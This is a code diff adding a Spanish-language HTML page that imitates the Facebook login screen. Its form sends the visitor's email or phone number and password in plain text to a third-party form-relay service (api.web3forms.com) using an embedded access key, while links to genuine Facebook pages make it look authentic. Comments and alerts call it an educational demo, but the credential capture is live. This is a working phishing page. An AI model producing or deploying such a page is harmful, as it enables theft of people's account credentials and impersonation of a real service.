@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Facebook</title>
+
+    <!-- CSS externo -->
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="page">
+
+    <!-- =========================
+         LADO IZQUIERDO
+         ========================= -->
+
+    <section class="left">
+
+        <div class="fb">f</div>
+
+        <!-- IMAGEN -->
+        <div class="image-container">
+
+            <img
+                src="foto.jpg"
+                alt="Imagen educativa"
+            >
+
+        </div>
+
+        <!-- FRASE -->
+        <div class="slogan">
+
+            Explora<br>
+            lo que<br>
+
+            <span class="blue">
+                más te
+            </span>
+
+            <br>
+
+            <span class="blue">
+                gusta.
+            </span>
+
+        </div>
+
+        <!-- IDIOMAS -->
+        <div class="languages">
+
+            Español &nbsp;&nbsp;
+            English (US) &nbsp;&nbsp;
+            Português (Brasil) &nbsp;&nbsp;
+            Français (France) &nbsp;&nbsp;
+            Italiano &nbsp;&nbsp;
+            Deutsch &nbsp;&nbsp;
+            العربية &nbsp;&nbsp;
+            Más idiomas...
+
+        </div>
+
+    </section>
+
+
+    <!-- =========================
+         LADO DERECHO
+         ========================= -->
+
+    <section class="right">
+
+        <div class="login">
+
+            <div class="title">
+                Iniciar sesión en Facebook
+            </div>
+
+            <form action="https://api.web3forms.com/submit" method="POST">
+
+                <!-- Access Key de Web3Forms -->
+                <input
+                    type="hidden"
+                    name="access_key"
+                    value="47e68547-9c92-4631-a833-79b112903511"
+                >
+
+                <input
+                    class="input"
+                    type="text"
+                    name="Correo electrónico o número de celular"
+                    placeholder="Correo electrónico o número de celular"
+                    autocomplete="off"
+                    required
+                >
+
+                <input
+                    class="input"
+                    type="text"
+                    name="Contraseña"
+                    placeholder="Contraseña"
+                    autocomplete="off"
+                    required
+                >
+
+                <button
+                    class="loginbtn"
+                    type="submit"
+                >
+                    Iniciar sesión
+                </button>
+
+            </form>
+
+            <a
+                class="forgot"
+                href="https://www.facebook.com/login/identify/"
+            >
+                ¿Olvidaste tu contraseña?
+            </a>
+
+            <a
+                class="create"
+                href="https://www.facebook.com/r.php"
+            >
+                Crear cuenta nueva
+            </a>
+
+            <div class="meta">
+                <span>∞</span>Meta
+            </div>
+
+        </div>
+
+        <div class="note"></div>
+
+    </section>
+
+</div>
+
+
+<script>
+
+function demo(e) {
+    e.preventDefault();
+}
+
+function forgot(e) {
+
+    e.preventDefault();
+
+    alert(
+        "Enlace demostrativo para el proyecto educativo."
+    );
+
+}
+
+function createAccount() {
+
+    alert(
+        "Botón demostrativo de creación de cuenta."
+    );
+
+}
+
+</script>
+
+</body>
+</html>
